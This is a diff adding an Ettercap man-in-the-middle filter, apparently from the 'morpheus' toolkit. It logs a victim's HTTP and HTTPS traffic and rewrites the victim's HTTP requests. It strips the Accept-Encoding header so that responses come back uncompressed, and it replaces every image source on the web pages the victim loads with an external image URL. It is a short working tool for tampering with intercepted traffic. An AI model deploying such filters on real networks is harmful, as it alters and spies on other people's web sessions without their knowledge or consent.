@@ -1,0 +1,45 @@
+############################################################################
+#                                                                          #
+#  HTTPS Request/Response Filter                                           #
+#  based on code from ALoR & NaGA                                          #
+#                                                                          #
+#  This program is free software; you can redistribute it and/or modify    #
+#  it under the terms of the GNU General Public License as published by    #
+#  the Free Software Foundation; either version 2 of the License, or       #
+#  (at your option) any later version.                                     #
+#                                                                          #
+############################################################################
+
+
+##
+#  This filter will substitute the html tag '<img src=>'
+#  and injects your image in any webpage requested by TaRONE
+#  Warning: This filter only modifies http traffic..
+#  access this url to test: http://antt.dglab.gov.pt/
+##
+
+
+
+if (ip.proto == TCP && tcp.dst == 80 || tcp.src == 80) {
+    msg("[morpheus] host:ALL     [ ⊶  ]  port:80   [tcp] http ☆");
+}
+if (ip.proto == TCP && tcp.dst == 443 || tcp.src == 443) {
+    msg("[morpheus] host:ALL     [ ⊶  ]  port:443  [tcp] https ☆");
+}
+
+
+
+#####################
+## Replace Content ##
+#####################
+if (ip.proto == TCP && tcp.dst == 80) {
+   if (search(DATA.data, "Accept-Encoding")) {
+      replace("Accept-Encoding", "Accept-Rubbish!"); 
+        msg("\n[morpheus] host:TaRONE   [ ⊶ ]  port:80   [tcp] http ☆");
+          replace("img src=", "img src=\"http://www.cranklin.com/mickey.png\" ");
+          replace("IMG SRC=", "img src=\"http://www.cranklin.com/mickey.png\" ");
+        msg("[Morpheus] | status: (img) string found in tcp packet ✔");
+        msg("[Morpheus] |_ info : string replaced and forward to target ✔\n");
+   }
+}
+
